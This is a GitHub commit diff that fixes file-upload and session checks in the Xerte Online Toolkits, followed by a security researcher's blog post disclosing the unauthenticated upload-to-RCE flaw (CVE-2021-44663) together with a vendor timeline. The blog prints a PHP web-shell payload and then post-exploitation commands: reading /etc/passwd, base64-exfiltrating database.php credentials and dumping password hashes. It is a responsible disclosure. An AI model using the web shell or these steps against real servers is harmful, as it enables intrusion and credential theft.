|  |  | </IfModule> |

5 changes: 4 additions & 1 deletion

5
[plugins/file\_uploading-extension-check.php](#diff-6b6e7c93677a6ea81f23666512d013dcfe213ddc4d148ae30815e5b2a439def2 "plugins/file_uploading-extension-check.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/plugins/file_uploading-extension-check.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -84,7 +84,10 @@ function filter\_by\_extension\_name() { |
|  |  | return $args[0]; |
|  |  | } |
|  |  |  |
|  |  | if (Xerte\_Validate\_FileExtension::canRun() && $xerte\_toolkits\_site->enable\_file\_ext\_check) { |
|  |  | // TOR 2020-03-24 |
|  |  | // Force extension check, so DO NOT CHECK $xerte\_toolkits\_site->enable\_file\_ext\_check |
|  |  | //if (Xerte\_Validate\_FileExtension::canRun() && $xerte\_toolkits\_site->enable\_file\_ext\_check) { |
|  |  | if (Xerte\_Validate\_FileExtension::canRun()) { |
|  |  | Xerte\_Validate\_FileExtension::$BLACKLIST = $xerte\_toolkits\_site->file\_extensions; |
|  |  | add\_filter('editor\_upload\_file', 'filter\_by\_extension\_name'); |
|  |  | } |

4 changes: 2 additions & 2 deletions

4
[print/index.php](#diff-3c5a4bbf0cc34a5f71941ef3cf2aed8819bdd09bccd56869ca592f6813bec3cf "print/index.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/print/index.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -35,8 +35,8 @@ |
|  |  | <form id="form1" name="form1" method="get" action="print.php"> |
|  |  | <p>To see how this works use the example below or paste the full link to your own LO.</p> |
|  |  | <p> |
|  |  | <label>Link to LO: |
|  |  | <input name="link" type="text" id="link" value="http://training.mitchellmedia.co.uk/xerte/play.php?template\_id=96" size="100" /> |
|  |  | <label>The template id of the LO, : |
|  |  | <input name="template\_id" type="text" id="template\_id" value="" size="80" /> |
|  |  | </label> |
|  |  | </p> |
|  |  | <p>Print LO pages: |
| Expand Down | |  |

11 changes: 8 additions & 3 deletions

11
[print/print.php](#diff-20d606887d1ad28c0128cf3edc3d2f02d1ba801ba92189f876899620ee2c6f2e "print/print.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/print/print.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,3 +1,6 @@ |
|  |  | <?php |
|  |  | require\_once("../config.php"); |
|  |  | ?> |
|  |  | <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> |
|  |  | <html xmlns="http://www.w3.org/1999/xhtml"> |
|  |  | <head> |
| Expand Down  Expand Up | | @@ -30,12 +33,14 @@ |
|  |  |  |
|  |  | <div id="container"> |
|  |  | <div id="mainContent"> |
|  |  | <h1><?php |
|  |  | <p><?php |
|  |  | $hide=$\_GET["hide"]; |
|  |  | $link=$\_GET["link"]; |
|  |  | $template\_id=$\_GET["template\_id"]; |
|  |  | $from=$\_GET["from"]; |
|  |  | $to=$\_GET["to"]; |
|  |  |  |
|  |  |  |
|  |  | // Create the link |
|  |  | $link = $xerte\_toolkits\_site->site\_url . "play.php?template\_id=" . $template\_id; |
|  |  | #echo $link."<br>"; |
|  |  | while($from <= $to) |
|  |  | { |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[setup/htaccess.conf](#diff-6ebc0f1f106636b2a8406f8105aa3646e08fda0a9387b0bebbeaff5e521861eb "setup/htaccess.conf")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/setup/htaccess.conf)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | Options +FollowSymLinks |
|  |  | Options +FollowSymLinks -Indexes |
|  |  |  |
|  |  | rewriteEngine on |
|  |  |  |
| Expand Down | |  |

6 changes: 6 additions & 0 deletions

6
[website\_code/php/import/fileupload.php](#diff-27433bb0be90e431d40986f9afebe9ee2f8d1025a7f9e55c3cd7a86f1f8e3fdc "website_code/php/import/fileupload.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/website_code/php/import/fileupload.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -20,6 +20,12 @@ |
|  |  | require\_once "../../../config.php"; |
|  |  | require\_once "../../../plugins.php"; |
|  |  |  |
|  |  | if (!isset($\_SESSION['toolkits\_logon\_username'])) |
|  |  | { |
|  |  | \_debug("Session is invalid or expired"); |
|  |  | die("Session is invalid or expired"); |
|  |  | } |
|  |  |  |
|  |  | \_load\_language\_file("/website\_code/php/import/fileupload.inc"); |
|  |  |  |
|  |  | if(apply\_filters('editor\_upload\_file', $\_FILES)){ |
| Expand Down | |  |

6 changes: 6 additions & 0 deletions

6
[website\_code/php/management/upload.php](#diff-0f0b152421476b5a85197fcb35e4234e1d5b93f93c538f936a32c66736fcc817 "website_code/php/management/upload.php")

Show comments

[View file](/thexerteproject/xerteonlinetoolkits/blob/694a591b5ab7f634f036afaac10397cf3677a98c/website_code/php/management/upload.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,6 +17,12 @@ |
|  |  | global $xerte\_toolkits\_site; |
|  |  | $prefix = $xerte\_toolkits\_site->database\_table\_prefix; |
|  |  |  |
|  |  | if (!isset($\_SESSION['toolkits\_logon\_username'])) |
|  |  | { |
|  |  | \_debug("Session is invalid or expired"); |
|  |  | die("Session is invalid or expired"); |
|  |  | } |
|  |  |  |
|  |  | if($\_FILES['fileToUpload']['error'] == 4) |
|  |  | { |
|  |  | exit(TEMPLATE\_UPLOAD\_NO\_FILE\_SELECTED); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `694a591`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthexerteproject%2Fxerteonlinetoolkits%2Fcommit%2F694a591b5ab7f634f036afaac10397cf3677a98c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from riklutz.nl_7bc52fda_20250114_222803.html ===

[Skip to content](#content)

[Rik Lutz](https://riklutz.nl/)

Yet Another Network Engineer

     Menu

* [Whoami](https://riklutz.nl/whoami/)

![](https://riklutz.nl/wp-content/uploads/2021/03/cropped-bgHeader-1.png)

 by: [admin](https://riklutz.nl/author/admin/)Posted on: [October 30, 2021April 1, 2022](https://riklutz.nl/2021/10/30/unauthenticated-file-upload-to-remote-code-execution-in-xerte/)
# Unauthenticated file upload to Remote Code Execution in Xerte

So this is the second part of three vulnerability’s found over a longer period of time in Xerte. The vulnerability was a Unauthenticated file upload to Remote Code Execution (RCE). “Xerte is an award-winning suite of browser-based tools that allow anyone with a web browser to create interactive learning materials quickly and easily.” – <https://www.xerte.org.uk>. Xerte is an OpenSource project and can be found at: <https://github.com/thexerteproject/xerteonlinetoolkits>.

When creating digital learning materials a user can upload files to use in their project. When uploading a file, the file is validated on whether it is allowed or not. Uploading a PHP file is not allowed:

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-3.png)

Or is it? When uploading a file, not the extension is validated, but the content of the file. If the file starts with <?php it is rejected, when you put characters in from of the php tag its allowed. After uploading, the user can browse to their media folder and execute their PHP file. Thus making it possible to upload a web-shell and execute commands.

## Proof of concept

Create a malicious file to upload (e.q. a web-shell):

```
Hello World
<?php if(isset($_REQUEST['<redacted>'])){ echo "<pre>"; $cmd = ($_REQUEST['<redacted>']); system($cmd); echo "</pre>"; die; }?>
```

Start a new project and upload a file. When uploading take note of the media folder your uploading to:

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-5.png)

Navigate to the URL and execute the shell. After this we can execute commands on the server:

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-12.png)

Command: *id:*

![](https://riklutz.nl/wp-content/uploads/2021/12/Blog-Edited.png)

Command: *cat /etc/passwd:*

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-13-1024x609.png)
## Can we create a database dump? – this is a kids dream right?

Please note i would not have done this if i didn’t know the owners of the website. In the web-root there is a file called database.php containing the database settings. Its not possible to simply cat this file because php will try to execute it. We can export the file by base64 encoding it and then decoding it on our client. cmd: cat ../../../database.php |base64

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-9-1024x245.png)

And decode the output locally, *echo -n <output> | base64 -d*:

![I know you can decode broken base64 not confidential](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-10-1024x671.png)

With the database settings a new PHP file was uploaded to dump the database. Because this is an open source project the database structure was taken from github. Resulting in a dump of the user database (username and password hash):

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-11.png)
## Can we do this unauthenticated?

When testing I noticed that uploading a file is allowed without authenticating. I later found out this is due to a bug in *elfinder,* a plugin used in the website. But to upload a file, the media folder of a user is required. Brute forcing a media folder might work but they are semi random. When doing a gobuster a folder of interest was found: error\_logs. This folder contained a 43MB debug file.

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-14.png)

Searching the debug file we find 105 unique media folders to upload our payload:

![](https://riklutz.nl/wp-content/uploads/2021/10/afbeelding-15-1024x76.png)

**Time Line:**

* 16/03/2020: Initial disclosure to vendor
* 22/03/2020: Second attempt due to lack of response
* 23/03/2020: Response from vendor
* 25/03/2020: Vendor acknowledges the problem
* 27/03/2020: Fix has been deployed
  + <https://github.com/thexerteproject/xerteonlinetoolkits/commit/694a591b5ab7f634f036afaac10397cf3677a98c>
  + <https://www.xerte.org.uk/index.php/en/news/blog/80-news/336-xerte-3-8-5-important-security-update-now-available>
* 24/02/2022: CVE-2021-44663 assigned

[Security](https://riklutz.nl/category/security/)

## Post navigation

[Previous PostPrevious   Reflected XSS in Xerte](https://riklutz.nl/2021/10/30/reflected-xss-in-xerte/)[Next PostNext Unauthenticated Remote Code Execution in Narrowcasting client](https://riklutz.nl/2021/10/30/unauthenticated-remote-code-execution-in-narrowcasting-client/)

Search for:

## Recent Posts

* [Accessing my own data at ‘mijn ista’ (browser plugin)](https://riklutz.nl/2022/11/25/accessing-my-own-data-at-mijn-ista-browser-plugin/)
* [Finding password lists and credit card information using google dorks](https://riklutz.nl/2022/06/10/finding-password-lists-and-credit-card-information-using-google-dorks/)
* [Prowise Reflect v1.09 remote keystroke injection](https://riklutz.nl/2021/12/07/prowise-reflect-v1-09-remote-keystroke-injection/)
* [Authenticated file upload to Remote Code Execution in Xerte](https://riklutz.nl/2021/11/03/authenticated-file-upload-to-remote-code-execution-in-xerte/)
* [Unauthenticated Remote Code Execution in Narrowcasting client](https://riklutz.nl/2021/10/30/unauthenticated-remote-code-execution-in-narrowcasting-client/)
## Recent Comments

Theme Mero Blog by [Kantipur Themes](https://kantipurthemes.com/)


